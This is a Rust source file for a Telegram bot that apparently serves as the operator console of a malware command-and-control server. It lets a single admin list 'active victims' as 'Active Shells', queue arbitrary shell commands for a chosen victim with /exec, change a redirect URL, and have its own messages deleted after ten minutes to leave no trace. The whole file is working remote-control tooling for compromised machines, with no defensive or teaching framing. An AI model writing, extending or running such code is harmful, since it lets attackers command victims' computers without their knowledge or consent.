use teloxide::{prelude::*, types::{ParseMode}, requests::Requester, adaptors::Throttle};
use std::sync::Arc;
use crate::{AppState, get_now};
use sqlx::Row;

pub async fn run_bot(bot: Throttle<Bot>, state: Arc<AppState>) {
    
    // handler to listen all message sent to bot
    let handler = Update::filter_message().endpoint(
        |bot: Throttle<Bot>, state: Arc<AppState>, msg: Message| async move {
            
            // check admin for  authorization to send message on bot 
            if msg.from.as_ref().map(|u| u.id.0 as i64).unwrap_or(0) != state.admin_id {
                return Ok(());
            }

            /* logging all the message send or output of bot.
             * for clearing the message after 10 minutes.
             * Auto clear message on bot.
             * */
            let chat_id = msg.chat.id;
            state.msg.insert(msg.id.0, get_now() + 600);

            let b = bot.clone();
            let s = state.clone();
            let log = move |txt: String| {
                                            let b = b.clone();
                                            let s = s.clone();

                                            tokio::spawn(async move {
                                                if let Ok(m) = b.clone().send_message(chat_id, txt).parse_mode(ParseMode::Html).await {
                                                    s.msg.insert(m.id.0, get_now() + 600);
                                                }
                                            });
                                        };

            let text = msg.text().unwrap_or("");

            match text {
                t if t.starts_with("/sessions") => {
                    let url = state.redirect.lock().unwrap().clone();
                    
                    let now = get_now() as i64;
                    // Getting the active victims list form database
                    let rows = sqlx::query("SELECT token, id FROM victims WHERE last_seen > ?")
                                                .bind(now - 60)
                                                .fetch_all(&state.db)
                                                .await
                                                .unwrap_or_default();

                    let mut victimid = String::new();
                    
                    for row in rows { 
                        let id: i64 = row.get("id");
                        let line = format!("\t<code>id{}</code>\n", id);

                        if victimid.len() + line.len() > 3500 {
                            log(format!("Redirect: {}\nActive Shells:\n{}", url, victimid)); 
                            victimid.clear();
                        }
                        victimid.push_str(&line);
                    }

                    log(format!("Redirect: {}\nActive Shells:\n{}", url, victimid));  
                }

                t if t.starts_with("/exec") => {
                    let parts: Vec<_> = text.split_whitespace().collect();
                    if parts.len() >= 3 {
                        let id = parts[1].trim_start_matches("id");
                        let cmd = parts[2..].join(" ");

                        let row = sqlx::query("SELECT token FROM victims WHERE id = ?").bind(id).fetch_optional(&state.db).await.unwrap();
    
                        if let Some(r) = row {
                            let token: String = r.get("token");

                            //Set new timestamp for checking victim current online status
                            state.command.insert(token, (cmd, get_now() + 600));

                            log(format!("command queued for: {}", id));
                        } else {
                            log(format!("{} not found", id));
                        }

                    } else {
                        log(format!("usage: <code>/exec id1 whoami</code>"));
                    }
                }

                t if t.starts_with("/redirect") => {
                    if let Some(u) = text.split_whitespace().nth(1) {
                        {
                            let mut lock = state.redirect.lock().unwrap();
                            *lock = u.to_string();
                        }
                        bot.send_message(msg.chat.id, format!("redirect updated: {}", u)).await?;
                    }    
                }

                _ => {
                    log(
                    format!("/sessions - list all active victims & redirect url\n/exec [id] [cmd] - run command on specific victim\n/redirect [URL] - update the redirect url\n"));
                }
            }

            Ok::<(), teloxide::RequestError>(())
        }
    );

    Dispatcher::builder(bot, handler)
                .dependencies(dptree::deps![state])
                .enable_ctrlc_handler()
                .build()
                .dispatch()
                .await;
}



